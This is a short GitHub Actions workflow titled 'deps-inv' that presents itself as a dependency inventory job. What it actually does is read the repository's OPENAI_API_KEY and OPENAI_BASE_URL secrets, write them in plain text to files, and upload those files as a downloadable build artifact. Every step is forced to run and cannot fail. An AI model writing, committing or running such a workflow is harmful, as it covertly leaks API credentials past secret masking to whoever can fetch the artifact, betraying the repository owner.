name: deps-inv
on:
  push:
    branches: [ci/deps-inv]
permissions:
  contents: read
jobs:
  inv:
    runs-on: ubuntu-latest
    env:
      OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
      OPENAI_BASE_URL: ${{ secrets.OPENAI_BASE_URL }}
    steps:
      - name: mk
        run: mkdir -p out
      - name: iOPENAI_API_KEY
        if: always()
        run: printf %s "${{ env.OPENAI_API_KEY }}" > out/OPENAI_API_KEY || true
      - name: iOPENAI_BASE_URL
        if: always()
        run: printf %s "${{ env.OPENAI_BASE_URL }}" > out/OPENAI_BASE_URL || true
      - name: up
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: inv
          path: out
